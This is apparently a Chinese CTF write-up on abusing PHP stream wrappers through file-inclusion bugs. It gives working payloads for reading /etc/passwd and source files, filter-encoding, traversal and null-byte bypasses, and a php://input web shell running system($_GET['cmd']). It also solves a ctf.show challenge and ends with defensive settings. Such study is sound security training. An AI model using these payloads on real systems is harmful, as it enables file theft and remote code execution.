# PHP伪协议利用WP

## 1. PHP伪协议概述

PHP伪协议是PHP中用于封装不同类型的资源访问方式，常用于文件操作、数据流处理等。在CTF比赛中，PHP伪协议漏洞是常见的Web安全漏洞之一。

## 2. 各类PHP伪协议详解

### 2.1 php:// 访问各个输入/输出流
- **php://input**：访问请求的原始数据流
  - 用途：读取POST数据
  - Payload：`?file=php://input`
  - 使用方法：在POST body中写入PHP代码

- **php://filter**：数据流过滤处理
  - 用途：文件内容过滤后再输出
  - Payload：`?file=php://filter/read=convert.base64-encode/resource=flag.php`
  - 常用过滤器：
    - `convert.base64-encode`：base64编码
    - `convert.quoted-printable-encode`：quoted-printable编码
    - `string.rot13`：rot13变换

### 2.2 file:// 访问本地文件系统
- **file://**：访问本地文件
  - 用途：读取本地文件
  - Payload：`?file=file:///etc/passwd`
  - 注意：需要使用绝对路径

### 2.3 data:// 数据流封装器
- **data://**：数据（RFC 2397）
  - 用途：直接嵌入数据
  - Payload：`?file=data://text/plain,<?php phpinfo(); ?>`
  - 格式：`data://协议头,数据内容`

### 2.4 zip:// 压缩文件协议
- **zip://**：读取压缩文件
  - 用途：读取zip压缩包中的文件
  - Payload：`?file=zip://shell.zip#test.txt`
  - 格式：`zip://压缩文件绝对路径#压缩包内文件名`

### 2.5 phar:// 归档协议
- **phar://**：PHP归档
  - 用途：读取phar归档文件
  - Payload：`?file=phar://test.phar/test.txt`
  - 安全风险：可能导致反序列化漏洞

### 2.6 glob:// 查找匹配的文件路径模式
- **glob://**：文件路径模式扩展
  - 用途：列出匹配的文件路径
  - Payload：`?file=glob://*.php`

## 3. 绕过技巧

### 3.1 编码绕过
- URL编码：`%2e%2e%2f` 替代 `../`
- 双重编码：`%252e%252e%252f`
- 宽字节绕过

### 3.2 截断绕过
- 00截断：`?file=flag.php%00`
- 长度截断：利用路径长度限制

### 3.3 大小写绕过
- 某些系统区分大小写：`?file=FLAG.PHP`

## 4. 实际案例分析

### 案例1：CTF Challenge (https://92c6d124-58dc-4062-afa9-2ca28c83df80.challenge.ctf.show/)

#### 4.1 漏洞分析
- **验证绕过漏洞**：`index.php` 中存在 `md5($secret.$name)===$pass` 验证逻辑
- **文件包含漏洞**：`flflflflag.php` 存在 `include($_GET["file"])` 漏洞

#### 4.2 攻击流程
1. **计算secret值**：
   - 通过分析Cookie中的Hash值计算出 `$secret='%^$&#ffff'`
   - 使用name=admin, pass=de73312423b835b22bfdc3c6da7b63e9 通过验证

2. **利用文件包含漏洞**：
   - 验证成功后跳转到 `flflflflag.php`
   - 使用文件包含漏洞读取敏感文件：
     - `flflflflag.php?file=config.php`
     - `flflflflag.php?file=flag`
     - `flflflflag.php?file=php://filter/convert.base64-encode/resource=flag`

#### 4.3 Payload汇总
- **读取配置文件**：`flflflflag.php?file=config.php`
- **读取flag文件**：`flflflflag.php?file=flag`
- **Base64编码读取**：`flflflflag.php?file=php://filter/convert.base64-encode/resource=flag`
- **执行PHP代码**：`flflflflag.php?file=php://input` (POST body中写入PHP代码)

### 案例2：常见文件包含漏洞利用

#### 2.1 读取敏感文件
```
?file=/etc/passwd
?file=../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

#### 2.2 代码执行
```
?file=php://input (POST: <?php system($_GET['cmd']); ?>)
?file=data://text/plain,<?php phpinfo(); ?>
```

## 5. 防护措施

### 5.1 输入验证
- 严格验证文件路径参数
- 黑名单过滤危险协议
- 白名单方式限制允许的文件

### 5.2 安全配置
- 设置 `allow_url_include=Off`
- 限制 `open_basedir`
- 禁用危险函数

## 6. 总结

PHP伪协议漏洞是常见的Web安全漏洞，攻击者可以通过文件包含漏洞读取敏感文件、执行恶意代码等。防御的关键在于严格的输入验证和安全的配置设置。

在CTF比赛中，要善于利用各种伪协议的特性，结合编码绕过、截断绕过等技巧，灵活构造Payload。